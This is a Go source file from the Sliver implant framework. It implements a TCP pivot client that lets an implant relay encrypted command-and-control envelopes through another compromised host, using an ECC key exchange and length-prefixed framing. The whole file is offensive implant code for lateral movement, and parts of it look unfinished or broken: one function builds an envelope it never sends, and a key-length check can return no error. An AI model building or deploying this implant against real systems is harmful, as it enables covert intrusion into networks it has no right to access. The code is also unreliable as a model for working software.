package pivotclients

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"log"
	"net"
	"sync"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

// OriginID - Random origin identifier
func OriginID() int64 {
	buf := make([]byte, 8)
	rand.Read(buf)
	return int64(binary.LittleEndian.Uint64(buf))
}

// NetConnPivotClient - A TCP pivot client
type NetConnPivotClient struct {
	originID        int64
	conn            net.Conn
	readMutex       *sync.Mutex
	writeMutex      *sync.Mutex
	peerCipherCtx   *cryptography.CipherContext
	serverCipherCtx *cryptography.CipherContext

	readDeadline  time.Duration
	writeDeadline time.Duration
}

func (p *NetConnPivotClient) peerKeyExchange() error {
	publicKey, err := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error decoding public key: %v", err)
		// {{end}}
		return err
	}
	pivotHello, _ := proto.Marshal(&pb.PivotHello{
		PublicKey:          publicKey,
		PublicKeySignature: cryptography.ECCPublicKeySignature,
	})

	// Enforce deadlines on the key exchange
	p.conn.SetWriteDeadline(time.Now().Add(p.writeDeadline))
	p.write(pivotHello)
	p.conn.SetWriteDeadline(time.Time{})

	p.conn.SetReadDeadline(time.Now().Add(p.readDeadline))
	peerPublicKeyRaw, err := p.read()
	p.conn.SetReadDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error reading peer public key: %v", err)
		// {{end}}
		return err
	}
	peerHello := &pb.PivotHello{}
	err = proto.Unmarshal(peerPublicKeyRaw, peerHello)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error un-marshaling peer public key: %v", err)
		// {{end}}
		return err
	}
	peerSessionKey, err := cryptography.ECCDecryptFromPeer(peerHello.PublicKey, peerHello.PublicKeySignature, peerHello.SessionKey)
	if err != nil || len(peerSessionKey) != 32 {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error decrypting session key: %v", err)
		// {{end}}
		return err
	}
	peerSessionKeyBuf := [32]byte{}
	copy(peerSessionKeyBuf[:], peerSessionKey)
	p.peerCipherCtx = cryptography.NewCipherContext(peerSessionKeyBuf)
	return nil
}

func (p *NetConnPivotClient) serverKeyExchange() error {
	p.originID = OriginID()
	serverSessionKey := cryptography.RandomKey()
	ciphertext, err := cryptography.ECCEncryptToServer(serverSessionKey[:])
	if err != nil {
		return err
	}
	originEnvelope := &pb.PivotOriginEnvelope{
		Type:     pb.PivotOriginEnvelopeType_SESSION_INIT,
		OriginID: p.originID,
		Data:     ciphertext,
	}
	// p.WriteEnvelope(originEnvelope)

	return nil
}

// write - Write a message to the TCP pivot with a length prefix
// it's unlikely we can't write the 4-byte length prefix in one write
// so we fail if we can't, messages may be much longer so we try to
// drain the message buffer if we didn't complete the write
func (p *NetConnPivotClient) write(message []byte) error {
	p.writeMutex.Lock()
	defer p.writeMutex.Unlock()
	n, err := p.conn.Write(p.lengthOf(message))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error writing message length: %v", err)
		// {{end}}
		return err
	}
	if n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error writing message length: %v", err)
		// {{end}}
		return ErrFailedWrite
	}

	total := 0
	for total < len(message) {
		n, err = p.conn.Write(message[total:])
		total += n
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[tcppivot] Error writing message: %v", err)
			// {{end}}
			return err
		}
	}
	return nil
}

func (p *NetConnPivotClient) read() ([]byte, error) {
	p.readMutex.Lock()
	defer p.readMutex.Unlock()
	dataLengthBuf := make([]byte, 4)
	n, err := p.conn.Read(dataLengthBuf)
	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}

	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, bufSize)
	dataBuf := []byte{}
	totalRead := 0
	for {
		n, err := p.conn.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			break
		}
	}
	return dataBuf, err
}

func (p *NetConnPivotClient) lengthOf(message []byte) []byte {
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(message)))
	return dataLengthBuf.Bytes()
}

// WriteEnvelope - Write a complete envelope
func (p *NetConnPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Marshaling error: %s", err)
		// {{end}}
		return err
	}
	data, err = p.peerCipherCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Encryption error: %s", err)
		// {{end}}
		return err
	}
	return p.write(data)
}

// ReadEnvelope - Read a complete envelope
func (p *NetConnPivotClient) ReadEnvelope() (*pb.Envelope, error) {
	data, err := p.read()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error reading message: %v", err)
		// {{end}}
		return nil, err
	}
	data, err = p.peerCipherCtx.Decrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Decryption error: %s", err)
		// {{end}}
		return nil, err
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(data, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}
	return envelope, nil
}

// CloseSession - Close the TCP pivot session
func (p *NetConnPivotClient) CloseSession() error {
	return p.conn.Close()
}
